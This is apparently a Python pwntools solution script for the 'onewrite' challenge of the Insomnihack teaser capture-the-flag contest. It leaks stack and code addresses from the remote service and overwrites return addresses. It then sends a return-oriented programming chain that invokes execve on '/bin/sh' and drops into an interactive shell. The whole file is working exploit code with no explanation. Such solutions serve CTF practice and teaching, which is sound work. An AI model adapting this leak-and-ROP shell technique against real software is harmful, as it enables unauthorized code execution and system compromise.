from pwn import *
import time

#0x00000000000484e9 : pop rdx ; pop rsi ; ret
#0x00000000000084fa : pop rdi ; ret
#0x00000000000460ac : pop rax ; ret
#0x000000000006e605 : syscall ; ret
#r = process(["./onewrite"])
r = remote("onewrite.teaser.insomnihack.ch", 1337)
r.sendlineafter(">","1")
stack = int(r.recvline(),16)
print hex(stack)
r.sendafter(":",str(stack-0x8))
r.sendafter(":",p8(0xb8))
time.sleep(.5)
r.sendlineafter(">","2")
code = int(r.recvline(),16)-0x8a15
print hex(code)
r.sendafter(":",str(stack+0x10))
r.sendafter(":",p64(code+0x484c5))
r.sendlineafter(">","2")
r.sendafter(":",str(stack+0x1a))
#input(":")
magic= (code+0x89ae)&0xffff
magic<<=(8*6)
r.sendafter(":",p64(magic))
context.arch = "amd64"
addr = stack+0x60
payload = "a"*0x6 + flat(code+0x0484e9,0,0,code+0x84fa,addr,code+0x460ac,0x3b,code+0x6e605,"/bin/sh\x00")

#input(":")
r.send(payload)
r.interactive()
